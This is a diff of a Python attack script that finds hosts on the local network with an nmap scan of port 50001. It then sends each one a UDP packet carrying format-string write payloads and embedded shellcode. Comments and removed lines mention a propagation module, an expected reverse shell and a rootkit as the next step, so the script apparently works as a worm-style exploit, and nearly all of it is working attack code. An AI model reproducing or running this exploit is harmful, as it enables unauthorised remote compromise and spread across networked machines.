@@ -12,15 +12,6 @@ import socket
 import netifaces as ni
 import subprocess
 import ipaddress
-import re
-
-def ping_sweep(network):
-    # Run nmap for a ping sweep
-    try:
-        output = subprocess.check_output(['nmap', '-sn', network], text=True)
-        return output
-    except subprocess.CalledProcessError as e:
-        return ""
 
 # Function to get the network and subnet mask of the primary interface
 def get_interface():
@@ -29,32 +20,25 @@ def get_interface():
     interface = gateways['default'][ni.AF_INET][1]
     return interface
 
-def get_arp_neighbors(interface):
-    # Get the network details
+def get_network(interface):
     addr = ni.ifaddresses(interface)[ni.AF_INET][0]
     network = ipaddress.IPv4Network((addr['addr'], addr['netmask']), strict=False)
-    network_str = str(network)
-    # Perform a ping sweep to populate the ARP table
-    ping_sweep(network_str)
-    # Execute the arp command and get the output
-    arp_output = subprocess.check_output(['arp', '-a'], text=True)
-    # Initialize an empty list to hold the neighbor IPs
-    neighbors = []
+    return network
 
-    # Iterate over each line of the arp command output
-    for line in arp_output.splitlines():
-        # Use regular expression to extract the IP address
-        match = re.search(r'\(([^)]+)\)', line)
-        if match:
-            # Extract the IP address
-            ip_address = match.group(1)
+def port_scan(network, port):
+    try:
+        print('Scanning Network')
+        # Run nmap and pipe its output to awk
+        command = f'nmap -oG - -p {port} {network} | awk \'/Open$/{{print $2}}\''
+        output = subprocess.check_output(command, shell=True, text=True)
 
-            # Extract the interface information
-            if interface in line:
-                print(neighbors)
-                neighbors.append(ip_address)
-			
-    return neighbors
+        # Split the output by newlines to get a list of IPs
+        ip_addresses = output.strip().split('\n')
+        print('Done')
+        return ip_addresses
+    except subprocess.CalledProcessError as e:
+        return []
+
 
 def gen_discover_packet(ad_id, os, hn, user, inf, func):
     d  = bytes([0x3e, 0xd1, 0x1])
@@ -111,21 +95,21 @@ shellcode += b"\xcb\xe1\xcf\xd4\xb4\xc6\x9c\x61\x2d"
 #    data = ""
 #    print("[+] Propagation module activated...")
 
-
 try:
     interface = get_interface()
+    network = get_network(interface)
     port = 50001  # Define the port to scan
-    neighbors = get_arp_neighbors(interface)
-
+    neighbors = port_scan(network, port)
+    print('Lets attack')
+    
     for ip in neighbors:
+        print(ip, 'is fucked')
         p = gen_discover_packet(4919, 1, b'\x85\xfe%1$*1$x%18x%165$ln' + shellcode, b'\x85\xfe%18472249x%93$ln', 'ad', 'main')
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         s.sendto(p, (ip, port))
         s.close()
-        print('reverse shell should connect within 5 seconds')
         
 except Exception as e:
-    print(f"An error occurred: {e}")
     exit()
 
 #    next_action = "rootkit"
